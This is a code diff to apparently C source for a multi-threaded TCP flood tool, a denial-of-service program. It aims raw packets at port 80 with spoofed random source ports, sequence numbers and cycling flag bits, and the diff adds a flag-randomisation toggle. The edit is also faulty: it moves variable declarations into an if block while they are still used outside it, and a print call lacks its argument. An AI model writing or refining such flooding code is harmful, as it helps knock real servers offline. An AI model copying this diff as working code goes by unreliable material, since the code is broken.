@@ -48,11 +48,11 @@
 #define PORT 80
 #define NUM_OF_THREADS 3
 #define RUN_SECONDS 5
+#define USE_RANDOM_FLAGS 1
 #define MAX_PACKET_LENGTH 4096
 
 // 1 byte for true or false in main while loop
 uint8_t FLOODING = 1;
-unsigned int thread_count;
 
 // different threads need different function types
 #ifdef _WIN32
@@ -108,9 +108,11 @@ unsigned int thread_count;
 
     // vars to change the same tcp header flags
     register int i = 0;
-    uint16_t psh = 0;
-    uint16_t res1 = 0;
-    uint16_t res2 = 0;
+    if (USE_RANDOM_FLAGS) {
+        uint16_t psh = 0;
+        uint16_t res1 = 0;
+        uint16_t res2 = 0;
+    }
 
     //printf("Starting Flood\n");
     // after RUN_SECONDS is done FLOODING is set to 0 in the main thread ending the loop
@@ -131,15 +133,17 @@ unsigned int thread_count;
         tcph->seq = rand_cmwc() & 0xFFFF;
         tcph->source = htons(rand_cmwc() & 0xFFFF);
 
-        // random flags
-        if(psh > 1)  { psh = 1;  } 
-        if(res1 > 4) { res1 = 0; }
-        if(res2 > 3) { res2 = 0; }
-        tcph->psh = psh;
-        tcph->res1 = res1;
-        tcph->res2 = res2;
-        psh++; res1++; res2++; i++;
-
+        if (USE_RANDOM_FLAGS) {
+            // random flags
+            if(psh > 1)  { psh = 1;  } 
+            if(res1 > 4) { res1 = 0; }
+            if(res2 > 3) { res2 = 0; }
+            tcph->psh = psh;
+            tcph->res1 = res1;
+            tcph->res2 = res2;
+            psh++; res1++; res2++; 
+        }
+        i++;
         tcph->check = tcp_checksum(iph, tcph);
     }
     printf("Done! sent %d packets\n");
